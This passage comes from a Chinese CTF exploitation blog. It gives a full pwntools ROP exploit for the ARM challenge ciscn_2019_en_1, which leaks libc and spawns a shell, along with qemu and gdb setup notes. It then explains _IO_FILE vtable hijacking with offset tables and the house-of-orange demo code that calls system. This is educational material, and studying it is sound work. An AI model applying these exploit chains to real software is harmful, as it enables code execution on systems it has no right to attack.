title="思路"></a>思路</h3><p>寻找可用的gadget，为了后面能够进行参数传递势必要能够控制r0</p><p>直接用ROPgadget only pop时<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary &apos;ciscn_2019_en_1&apos;  --only &apos;pop&apos;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000103a4 : pop &#123;r3, pc&#125;</span><br><span class="line">0x000104f8 : pop &#123;r4, pc&#125;</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 2</span><br></pre></td></tr></table></figure></p><p>这里只能够直接控制r3 和返回地址pc ，所以还需要找点其他的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00010638 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125; ; andeq r0, r1, r8, lsl sb ; andeq r0, r1, r0, lsl sb ; bx lr</span><br></pre></td></tr></table></figure><p>这边发现能控制很多寄存器，但是没有r0；单独寻找r0相关，找到了这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00010628 : mov r0, r7 ; blx r3</span><br></pre></td></tr></table></figure></p><p>因为上一步能够控制r7，也就相当于可以控制这里的r0。构造rop链，第一次进行泄露libc地址，第二次getshell</p><p>中间发现使用上面的构造链会泄露完地址就fault退出，不过也发现了基址是不变的，可以泄露完再打一次getshell</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.binary = &apos;ciscn_2019_en_1&apos;</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process([&apos;qemu-arm&apos;, &apos;-L&apos;, &apos;/usr/arm-linux-gnueabi&apos;, &apos;ciscn_2019_en_1&apos;])</span><br><span class="line">elf = ELF(&apos;./ciscn_2019_en_1&apos;)</span><br><span class="line">libc = ELF(&apos;/usr/arm-linux-gnueabi/lib/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;./ciscn_2019_en_1&apos;)</span><br><span class="line"></span><br><span class="line">mov_r07_br3 = 0x10628</span><br><span class="line">pop_r3_pc = 0x103a4</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">puts_plt = elf.plt[&apos;puts&apos;]</span><br><span class="line">pop_r45678sbslpc = 0x10638</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">pay = &apos;a&apos;*0x24+p32(pop_r45678sbslpc)</span><br><span class="line">pay += p32(0)*3+p32(puts_got) #r7</span><br><span class="line">pay += p32(0)*3+p32(pop_r3_pc) #pc</span><br><span class="line">pay += p32(puts_plt) #r3</span><br><span class="line">pay += p32(mov_r07_br3) #pc</span><br><span class="line"></span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.recvuntil(&apos;\n&apos;)</span><br><span class="line">#print sh.recv()</span><br><span class="line">puts_addr = u32(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(4,&apos;\x00&apos;))</span><br><span class="line">libc.base = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">print hex(libc.base)</span><br><span class="line">system_addr = libc.base + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = libc.base + libc.search(&apos;/bin/sh\x00&apos;).next()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process([&apos;qemu-arm&apos;, &apos;-L&apos;, &apos;/usr/arm-linux-gnueabi&apos;, &apos;ciscn_2019_en_1&apos;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x24+p32(pop_r45678sbslpc)</span><br><span class="line">pay += p32(0)*3+p32(binsh_addr)</span><br><span class="line">pay += p32(0)*3+p32(pop_r3_pc)</span><br><span class="line">pay += p32(system_addr)</span><br><span class="line">pay += p32(mov_r07_br3)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="之前的尝试笔记"><a href="#之前的尝试笔记" class="headerlink" title="之前的尝试笔记"></a>之前的尝试笔记</h1><p>之前做到的比较好的地方在于动态链接程序也能直接跑而不用指定库，应该是建立的软连接和导入库路径的设置</p><h2 id="arm-程序运行"><a href="#arm-程序运行" class="headerlink" title="arm 程序运行"></a>arm 程序运行</h2><ol><li><p>安装必要的程序 qemu  gcc for arm 交叉编译 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu gcc-5-arm-linux-gnueabihf gcc-5-multilib-arm-linux-gnueabihf</span><br></pre></td></tr></table></figure></li><li><p>运行arm文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm ./filename</span><br></pre></td></tr></table></figure></li></ol><p>提示找不到库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/lib/ld-linux-armhf.so.3: No such file or directory</span><br></pre></td></tr></table></figure></p><p>查找并建立软连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -name ld-linux-armhf.so.3</span><br><span class="line"></span><br><span class="line">sudo ln -s /usr/arm-linux-gnueabihf/lib/ld-linux-armhf.so.3 /lib/ld-linux-armhf.so.3</span><br></pre></td></tr></table></figure></p><p>再运行找不到libc.so.6<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=/usr/arm-linux-gnueabihf/lib/:$LD_LIBRARY_PATH</span><br></pre></td></tr></table></figure></p><p>方便起见写入自启动脚本（一般还是不要写的好。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;export LD_LIBRARY_PATH=/usr/arm-linux-gnueabihf/lib/:$LD_LIBRARY_PATH&quot; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure></p><h2 id="arm-gdb"><a href="#arm-gdb" class="headerlink" title="arm-gdb"></a>arm-gdb</h2><p>gdb源码下载：<a href="http://www.gnu.org/software/gdb/download/" target="_blank" rel="noopener">http://www.gnu.org/software/gdb/download/</a></p><p>gdb 版本不要太高，这里选择和本机一个版本的gdb</p><p>解压：tar xvf gdb-7.11.1.tar.xz</p><p>安装可能需要的库</p><p>sudo apt-get install  texinfo libncurses5-dev m4 flex bison</p><ul><li>编译arm-linux-gdb  &amp; gdbserver</li></ul><p>进入源码目录： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --target=arm-linux --prefix=/home/sirius/tools/gdb/arm-gdb</span><br><span class="line">make -j8</span><br><span class="line">sudo make install -j8</span><br></pre></td></tr></table></figure><p>这里可能会报错说__NR_rt_sigreturn未定义<br>加个头文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#ifndef  __NR_sigreturn</span><br><span class="line">#include &lt;asm/unistd.h&gt;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></p><p>arm-gdb/bin 下可以看到 arm-linux-gdb arm-linux-run</p><p>将其加入环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/profile</span><br><span class="line">export PATH=$PATH:/home/sirius/tools/gdb/arm-gdb/bin</span><br></pre></td></tr></table></figure><ul><li>编译gdb client</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd gdb/gdbserver</span><br><span class="line">export PATH=$PATH:/home/sirius/tools/gdb/arm-gdb/bin</span><br><span class="line">./configure --target=arm-linux --host=arm-linux-gnueabi</span><br><span class="line"></span><br><span class="line">vi config.h</span><br><span class="line">#define HAVA_SYS_REG_H  将此句注释</span><br><span class="line"></span><br><span class="line">make CC=arm-linux-gnueabi-gcc  -j8</span><br></pre></td></tr></table></figure><p>这里可能会报错说没有arm-linux-gnueabi-gcc， 使用apt安装就可以了</p><ul><li>使用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbserver :1234 ./pwn</span><br></pre></td></tr></table></figure></li></ul><p>这里调试的时候便会出错</p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>_IO_FILE 利用方法</title>
      <link href="/2019/07/09/io-file-%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2019/07/09/io-file-%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>细节知识可以看<a href="https://www.siriuswhiter.tk/2019/07/08/io-file-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://www.siriuswhiter.tk/2019/07/08/io-file-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</a></p><p>FILE结构体会通过struct _IO_FILE *_chain链接成一个链表，64位程序下其偏移为0x60，链表头部用_IO_list_all指针表示。<br><figure class="image-box">                <img src="/2019/07/09/io-file-利用方法/1.png" alt="图示" title="" class="">                <p>图示</p>            </figure></p><p>所以新建的文件句柄的chains会指向stderr</p><p>IO_file结构体外面还被一个IO_FILE_plus结构体包裹着，其定义如下：</p><p>struct _IO_FILE_plus<br>{<br>    _IO_FILE    file;<br>    IO_jump_t   *vtable;<br>}</p><p>输出方法,eg:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p  *(struct _IO_FILE_plus *) stdout</span><br></pre></td></tr></table></figure></p><h3 id="IO-FILE-结构体"><a href="#IO-FILE-结构体" class="headerlink" title="IO_FILE 结构体"></a>IO_FILE 结构体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE &#123;</span><br><span class="line">  int _flags;/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="line">#define _IO_file_flags _flags</span><br><span class="line"></span><br><span class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</span><br><span class="line">  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br><span class="line">  char* _IO_read_ptr;/* Current read pointer */</span><br><span class="line">  char* _IO_read_end;/* End of get area. */</span><br><span class="line">  char* _IO_read_base;/* Start of putback+get area. */</span><br><span class="line">  char* _IO_write_base;/* Start of put area. */</span><br><span class="line">  char* _IO_write_ptr;/* Current put pointer. */</span><br><span class="line">  char* _IO_write_end;/* End of put area. */</span><br><span class="line">  char* _IO_buf_base;/* Start of reserve area. */</span><br><span class="line">  char* _IO_buf_end;/* End of reserve area. */</span><br><span class="line">  /* The following fields are used to support backing up and undo. */</span><br><span class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</span><br><span class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</span><br><span class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</span><br><span class="line"></span><br><span class="line">  struct _IO_marker *_markers;</span><br><span class="line"></span><br><span class="line">  struct _IO_FILE *_chain;                       /* 偏移： 0x68-0x70 */</span><br><span class="line"></span><br><span class="line">  int _fileno;</span><br><span class="line">#if 0</span><br><span class="line">  int _blksize;</span><br><span class="line">#else</span><br><span class="line">  int _flags2;</span><br><span class="line">#endif</span><br><span class="line">  _IO_off_t _old_offset; /* This used to be _offset but it&apos;s too small.  */</span><br><span class="line"></span><br><span class="line">#define __HAVE_COLUMN /* temporary */</span><br><span class="line">  /* 1+column number of pbase(); 0 is unknown. */</span><br><span class="line">  unsigned short _cur_column;</span><br><span class="line">  signed char _vtable_offset;                    </span><br><span class="line">  char _shortbuf[1];</span><br><span class="line"></span><br><span class="line">  /*  char* _save_gptr;  char* _save_egptr; */</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">#ifdef _IO_USE_OLD_IO_FILE</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="偏移记录"><a href="#偏移记录" class="headerlink" title="偏移记录"></a>偏移记录</h3><p>方便在使用时查看偏移进行伪造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE_plus_size = &#123;</span><br><span class="line">&apos;i386&apos;:0x98,</span><br><span class="line">&apos;amd64&apos;:0xe0</span><br><span class="line">&#125;</span><br><span class="line">_IO_FILE_plus = &#123;</span><br><span class="line">&apos;i386&apos;:&#123;</span><br><span class="line">0x0:&apos;_flags&apos;,</span><br><span class="line">0x4:&apos;_IO_read_ptr&apos;,</span><br><span class="line">0x8:&apos;_IO_read_end&apos;,</span><br><span class="line">0xc:&apos;_IO_read_base&apos;,</span><br><span class="line">0x10:&apos;_IO_write_base&apos;,</span><br><span class="line">0x14:&apos;_IO_write_ptr&apos;,</span><br><span class="line">0x18:&apos;_IO_write_end&apos;,</span><br><span class="line">0x1c:&apos;_IO_buf_base&apos;,</span><br><span class="line">0x20:&apos;_IO_buf_end&apos;,</span><br><span class="line">0x24:&apos;_IO_save_base&apos;,</span><br><span class="line">0x28:&apos;_IO_backup_base&apos;,</span><br><span class="line">0x2c:&apos;_IO_save_end&apos;,</span><br><span class="line">0x30:&apos;_markers&apos;,</span><br><span class="line">0x34:&apos;_chain&apos;,</span><br><span class="line">0x38:&apos;_fileno&apos;,</span><br><span class="line">0x3c:&apos;_flags2&apos;,</span><br><span class="line">0x40:&apos;_old_offset&apos;,</span><br><span class="line">0x44:&apos;_cur_column&apos;,</span><br><span class="line">0x46:&apos;_vtable_offset&apos;,</span><br><span class="line">0x47:&apos;_shortbuf&apos;,</span><br><span class="line">0x48:&apos;_lock&apos;,</span><br><span class="line">0x4c:&apos;_offset&apos;,</span><br><span class="line">0x54:&apos;_codecvt&apos;,</span><br><span class="line">0x58:&apos;_wide_data&apos;,</span><br><span class="line">0x5c:&apos;_freeres_list&apos;,</span><br><span class="line">0x60:&apos;_freeres_buf&apos;,</span><br><span class="line">0x64:&apos;__pad5&apos;,</span><br><span class="line">0x68:&apos;_mode&apos;,</span><br><span class="line">0x6c:&apos;_unused2&apos;,</span><br><span class="line">0x94:&apos;vtable&apos;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&apos;amd64&apos;:&#123;</span><br><span class="line">0x0:&apos;_flags&apos;,</span><br><span class="line">0x8:&apos;_IO_read_ptr&apos;,</span><br><span class="line">0x10:&apos;_IO_read_end&apos;,</span><br><span class="line">0x18:&apos;_IO_read_base&apos;,</span><br><span class="line">0x20:&apos;_IO_write_base&apos;,</span><br><span class="line">0x28:&apos;_IO_write_ptr&apos;,</span><br><span class="line">0x30:&apos;_IO_write_end&apos;,</span><br><span class="line">0x38:&apos;_IO_buf_base&apos;,</span><br><span class="line">0x40:&apos;_IO_buf_end&apos;,</span><br><span class="line">0x48:&apos;_IO_save_base&apos;,</span><br><span class="line">0x50:&apos;_IO_backup_base&apos;,</span><br><span class="line">0x58:&apos;_IO_save_end&apos;,</span><br><span class="line">0x60:&apos;_markers&apos;,</span><br><span class="line">0x68:&apos;_chain&apos;,</span><br><span class="line">0x70:&apos;_fileno&apos;,</span><br><span class="line">0x74:&apos;_flags2&apos;,</span><br><span class="line">0x78:&apos;_old_offset&apos;,</span><br><span class="line">0x80:&apos;_cur_column&apos;,</span><br><span class="line">0x82:&apos;_vtable_offset&apos;,</span><br><span class="line">0x83:&apos;_shortbuf&apos;,</span><br><span class="line">0x88:&apos;_lock&apos;,</span><br><span class="line">0x90:&apos;_offset&apos;,</span><br><span class="line">0x98:&apos;_codecvt&apos;,</span><br><span class="line">0xa0:&apos;_wide_data&apos;,</span><br><span class="line">0xa8:&apos;_freeres_list&apos;,</span><br><span class="line">0xb0:&apos;_freeres_buf&apos;,</span><br><span class="line">0xb8:&apos;__pad5&apos;,</span><br><span class="line">0xc0:&apos;_mode&apos;,</span><br><span class="line">0xc4:&apos;_unused2&apos;,</span><br><span class="line">0xd8:&apos;vtable&apos;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IO-jump-t表结构"><a href="#IO-jump-t表结构" class="headerlink" title="IO_jump_t表结构"></a>IO_jump_t表结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_jump_t</span><br><span class="line">&#123;</span><br><span class="line">    JUMP_FIELD(size_t, __dummy);</span><br><span class="line">    JUMP_FIELD(size_t, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    /* showmany */</span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="常用对应iofile函数"><a href="#常用对应iofile函数" class="headerlink" title="常用对应iofile函数"></a>常用对应iofile函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fread    -&gt; __xsgetn   -&gt; __doallocate  -&gt; __stat  -&gt; __underflow -&gt; __read</span><br><span class="line">fwrite    -&gt; __xsputn   -&gt; __docallocate  -&gt; __overflow  -&gt; __write</span><br><span class="line">fclose    -&gt;  __finish  -&gt; __overflow  /  -&gt; __fclose   //根据标志位来改变模式</span><br><span class="line">malloc_printerr    -&gt; __overflow</span><br><span class="line">exit    -&gt; _setbuf</span><br></pre></td></tr></table></figure><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>在源码分析中我们知道io相关操作最后会调用vtable中的函数，所以利用方法就是修改vtable中的值，或者是实现对整个FILE结构体的伪造来修改虚表，当然本质上没有太大的区别。</p><h1 id="利用演示"><a href="#利用演示" class="headerlink" title="利用演示"></a>利用演示</h1><p>还是使用下how2heap上的例子，这里是结合了house of orange，可以跟着源码调试理解。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int winner ( char *ptr);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    char *p1, *p2;</span><br><span class="line">    size_t io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    // 首先分配一个 0x400 的 chunk</span><br><span class="line">    p1 = malloc(0x400-16);</span><br><span class="line"></span><br><span class="line">    // 拿到 top chunk的地址</span><br><span class="line">    top = (size_t *) ( (char *) p1 + 0x400 - 16);</span><br><span class="line">    // 修改 top chunk 的 size</span><br><span class="line">    top[1] = 0xc01;</span><br><span class="line"></span><br><span class="line">    // 触发 syscall 的 _int_free, top_chunk 放到了 unsort bin</span><br><span class="line">    p2 = malloc(0x1000);</span><br><span class="line"></span><br><span class="line">    // 根据 fd 指针的偏移计算 io_list_all 的地址</span><br><span class="line">    io_list_all = top[2] + 0x9a8;</span><br><span class="line"></span><br><span class="line">    // 修改 top_chunk 的 bk 为  io_list_all - 0x10 ， 后面会触发</span><br><span class="line">    top[3] = io_list_all - 0x10;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     设置 fp 指针指向位置 开头 为 /bin/sh</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    memcpy( ( char *) top, &quot;/bin/sh\x00&quot;, 8);</span><br><span class="line"></span><br><span class="line">    // 修改 top chunk 的 大小 为 0x60</span><br><span class="line">    top[1] = 0x61;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">      为了可以正常调用 overflow() ，需要满足一些条件</span><br><span class="line">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    _IO_FILE *fp = (_IO_FILE *) top;</span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = 0; </span><br><span class="line">    fp-&gt;_IO_write_base = (char *) 2;</span><br><span class="line">    fp-&gt;_IO_write_ptr = (char *) 3; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 设置虚表</span><br><span class="line">    size_t *jump_table = &amp;top[12]; // controlled memory</span><br><span class="line">    jump_table[3] = (size_t) &amp;winner;</span><br><span class="line">    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8</span><br><span class="line"></span><br><span class="line">    // 再次 malloc, fastbin, smallbin都找不到需要的大小，会遍历 unsort bin 把它们添加到对应的 bins 中去</span><br><span class="line">    // 之前已经把 top-&gt;bk 设置为 io_list_all - 0x10, 所以会把 io_list_all 的值 设置为 fd, </span><br><span class="line">    // 也就是 main_arena+88 </span><br><span class="line">    // _IO_FILE_plus + 0x68 --&gt; _china , main_arena+88 + 0x68 为 smallbin[5], 块大小为 0x60 </span><br><span class="line">    // 所以要把 top的 size 设置为 0x60</span><br><span class="line">    malloc(10);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int winner(char *ptr)</span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以发现，实际上在利用时是将top 